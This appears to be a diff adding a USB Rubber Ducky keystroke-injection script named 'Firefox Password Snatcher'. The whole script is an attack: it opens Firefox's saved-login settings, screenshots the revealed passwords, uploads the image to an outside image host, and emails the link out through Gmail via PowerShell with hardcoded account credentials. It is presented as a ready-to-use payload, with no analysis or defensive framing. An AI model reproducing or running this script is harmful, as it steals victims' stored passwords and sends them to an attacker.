@@ -1,0 +1,124 @@
+REM ########################## Firefox Password Snatcher ##########################
+REM ######################## Authors: WhereItsAt and Lewis ########################
+DELAY 2000
+REM #### Open firefox ####
+GUI r
+DELAY 1000
+STRING firefox -new-tab about:preferences#security
+DELAY 1000
+ENTER
+DELAY 4000
+REM #### 10 tabs then enter ####
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 500
+ENTER
+DELAY 500
+STRING google
+DELAY 700
+REM #### 5 tabs then 2 enters then printscreen ####
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 500
+PRINTSCREEN
+REM #### Upload printscreen to a hosting site and copy link ####
+DELAY 500
+CTRL t
+DELAY 500 
+STRING https://ctrlv.cz
+DELAY 500
+ENTER
+DELAY 3000
+CTRL v
+DELAY 3000
+CTRL c
+DELAY 500
+ALT F4
+DELAY 1000
+REM #### Send link via gmail ####
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+CTRL ALT 4
+STRING SMTPServer = 'smtp.gmail.com'
+ENTER
+CTRL ALT 4
+STRING SMTPInfo = New-Object Net.Mail.SmtpClient(
+CTRL ALT 4
+STRING SmtpServer, 587)
+ENTER
+CTRL ALT 4
+STRING SMTPInfo.EnableSsl = 
+CTRL ALT 4
+STRING true
+ENTER
+CTRL ALT 4
+STRING SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('lewis.pwned
+CTRL ALT 2
+STRING gmail.com', 'lewis1337');
+ENTER
+CTRL ALT 4
+STRING ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+CTRL ALT 4
+STRING ReportEmail.From = 'lewis.pwned
+CTRL ALT 2
+STRING gmail.com'
+ENTER
+CTRL ALT 4
+STRING ReportEmail.To.Add('lewis.pwned
+CTRL ALT 2
+STRING gmail.com')
+ENTER
+CTRL ALT 4
+STRING ReportEmail.Subject = 'NEW: Ducky firefox passwords'
+ENTER
+CTRL ALT 4
+STRING ReportEmail.Body = 'Here is the link to your passwords - 
+DELAY 200
+ALT SPACE
+DELAY 200
+STRING m
+DELAY 200
+STRING l
+DELAY 500
+STRING '
+ENTER
+CTRL ALT 4
+STRING SMTPInfo.Send(
+CTRL ALT 4
+STRING ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
